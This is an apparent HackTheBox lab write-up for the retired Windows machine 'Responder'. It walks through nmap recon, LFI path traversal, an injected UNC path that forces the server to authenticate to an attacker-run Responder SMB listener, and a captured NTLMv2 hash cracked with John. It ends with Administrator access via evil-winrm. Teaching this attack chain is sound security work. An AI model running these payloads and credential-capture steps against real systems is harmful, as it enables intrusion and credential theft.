---
title: HTB · Responder
slug: htb-responder
date: 2026-07-21
image: responder
platform: HackTheBox
os: Windows
difficulty: Very Easy
points: 150
tags: [hackthebox, windows, very-easy, retired, lfi, responder, ntlm-hash-capture, evil-winrm]
description: This lab focuses on how a File Inclusion vulnerability on a webpage being served on a Windows machine can be exploited to collect the NetNTLMv2 challenge of the user that is running the web server.
featured: true
---


# Overview

**Responder** is a Windows "Very Easy" machine on HackTheBox that demonstrates a classic attack chain: **Local File Inclusion (LFI)** on a Windows web server is leveraged to force the server to authenticate to an attacker-controlled SMB server, capturing an **NTLMv2 hash** that is then cracked offline and used to gain administrative access via **WinRM**.

This write-up covers the full methodology, the protocol mechanics, and the lessons that transfer to other machines and exams.

---
# Reconnaissance

## Staged Nmap Scanning
Never run a full port scan as your first move in a timed environment. Use a staged approach:

```bash
nmap -sC -sV -oN nmap/initial 10.129.252.61

nmap -sC -sV -p 80,5985 -oN nmap/deep 10.129.252.61
```

### Initial Scan Results

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

**Key Observations:**
- Port 80: Apache on **Windows** with **PHP** — unusual combo, suggests a WAMP/XAMPP stack
- Port 5985: **WinRM** (Windows Remote Management) — this is your post-exploitation access vector
- Only 2 ports open — the attack surface is small and web-focused
## Hosts File

The website uses a virtual host. Add it to `/etc/hosts` **immediately**:
```bash
echo "10.129.252.61 unika.htb" | sudo tee -a /etc/hosts
```

---
# Web Enumeration
## Initial Inspection

Navigating to `http://unika.htb/` reveals a simple website with a language selection feature. The URL structure changes to:
```
http://unika.htb/index.php?page=french.html
```
The `page` parameter loads different HTML files. This is a classic **Local File Inclusion (LFI)** vector.
## Confirming LFI

Test by including a known Windows system file:
```
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```
If the `hosts` file contents are displayed, LFI is confirmed.

> **Why this works:** The PHP `include()` or `require()` function is being used with user-controlled input without proper sanitization. The `../` sequences traverse up the directory tree until reaching the filesystem root, then descend into `windows/system32/drivers/etc/hosts`.
---
# Exploitation: NTLM Hash Capture via Responder
## The Attack Concept

On **Windows**, when an application attempts to access a remote SMB resource (a UNC path like `\\IP\share\file`), the Windows operating system **automatically attempts to authenticate** to that remote server using the current process credentials or cached credentials. This is by design in Windows networking.

By injecting an SMB UNC path into the LFI parameter, we force the web server to initiate an SMB connection to our attacker machine. We run a malicious SMB server that captures the authentication handshake.

**The Protocol Flow:**
1. We inject `\\ATTACKER_IP\share\file` into the LFI parameter
2. PHP passes this to the Windows OS to fetch the file
3. Windows sees an SMB path and initiates an SMB session
4. Our malicious SMB server (Responder) responds and requests authentication
5. Windows sends an **NTLM challenge-response** containing a hash of the service account credentials
6. We capture this hash and crack it offline
## Setting Up Responder

Responder is an LLMNR, NBT-NS, and MDNS poisoner with a built-in SMB server. It is specifically designed for this scenario.

```bash
git clone https://github.com/lgandx/Responder

sudo python3 Responder.py -I tun0
```

**What Responder does:**
- Listens for multicast name resolution queries
- Responds to SMB connection requests
- Captures NTLM challenge-response handshakes
- Saves hashes to a file for offline cracking
## Triggering the Authentication

With Responder running, inject the SMB path into the browser:

```
http://unika.htb/?page=//10.10.14.71/somefile
```

Responder will immediately display a captured hash in the terminal output.

---
# Hash Cracking
## Extract the Hash
  
Responder saves captured hashes automatically, but you can also copy the output directly. The hash format is **NTLMv2**:
```
Administrator::RESPONDER:74cec23191d0c69c:F2F51914C751794BA9DD7CFD9339E6BE:010100000000000080019B3C8A29DD011B23F1209A3862AD00000000020008004C0059004F00330001001E00570049004E002D0051004F005A0054005900440041005400490043004B0004003400570049004E002D0051004F005A0054005900440041005400490043004B002E004C0059004F0033002E004C004F00430041004C00030014004C0059004F0033002E004C004F00430041004C00050014004C0059004F0033002E004C004F00430041004C000700080080019B3C8A29DD010600040002000000080030003000000000000000010000000020000063A81FFD925D5426B6D70ADA34648CE3FCCD9522C9AA7C777933F184005912530A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370031000000000000000000
```
## Crack with John the Ripper

```bash
# Save hash to file

echo "Administrator::RESPONDER:74cec23191d0c69c:F2F51914C751794BA9DD7CFD9339E6BE:010100000000000080019B3C8A29DD011B23F1209A3862AD00000000020008004C0059004F00330001001E00570049004E002D0051004F005A0054005900440041005400490043004B0004003400570049004E002D0051004F005A0054005900440041005400490043004B002E004C0059004F0033002E004C004F00430041004C00030014004C0059004F0033002E004C004F00430041004C00050014004C0059004F0033002E004C004F00430041004C000700080080019B3C8A29DD010600040002000000080030003000000000000000010000000020000063A81FFD925D5426B6D70ADA34648CE3FCCD9522C9AA7C777933F184005912530A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370031000000000000000000" > hash.txt

# Crack with rockyou.txt

john -w=/usr/share/wordlists/rockyou.txt hash.txt
```
**Cracked Password:** `badminton`

---
# Post-Exploitation: WinRM Access

## Why WinRM?

Port 5985 was open from the start. WinRM (Windows Remote Management) is Microsoft's implementation of WS-Management Protocol, providing a firewall-friendly way to remotely manage Windows systems. It is essentially **PowerShell remoting over HTTP**.
## Evil-WinRM

While PowerShell Core (`pwsh`) can run on Linux, Evil-WinRM is the preferred tool because it is purpose-built for penetration testing:

- Menu-based navigation
- File upload/download
- Invoke-Binary functionality
- Colorized output
- No dependency on PowerShell Core installation

```bash
evil-winrm -i 10.129.252.61 -u administrator -p badminton
```

## Shell as Administrator

Upon connection, you receive an interactive PowerShell session as the **Administrator** user. From here, you have full system access.
## Retrieving the Flag

The user flag is located on the desktop of a user named `mike`:

```powershell
cd C:\Users\mike\Desktop
cat user.txt
```

**Flag:** `ea81xxxxxxxxxxxxxxxxxxxxxxxxx`

---
# Privilege Escalation

**N/A — Direct Administrative Access**

No privilege escalation was required on this machine. The cracked NTLM hash belonged to the **Administrator** account, which provided direct administrative access via WinRM. On harder machines, privilege escalation would be a separate, multi-step phase involving service exploitation, token impersonation, kernel exploits, or misconfigured permissions.

---
# Tools used

| **Tool**           | **Purpose**                                |
| ------------------ | ------------------------------------------ |
| `nmap`             | Port scanning and service enumeration      |
| `Responder`        | Malicious SMB server for NTLM hash capture |
| `john`             | Offline password hash cracking             |
| `evil-winrm`       | WinRM remote shell client                  |


---
# References
- [Responder — GitHub](https://github.com/lgandx/Responder)
- [Evil-WinRM — GitHub](https://github.com/Hackplayers/evil-winrm)
- [TCM Security — SMB Relay Attacks](https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/)
- [HackTheBox — Responder](https://app.hackthebox.com/machines/Responder)
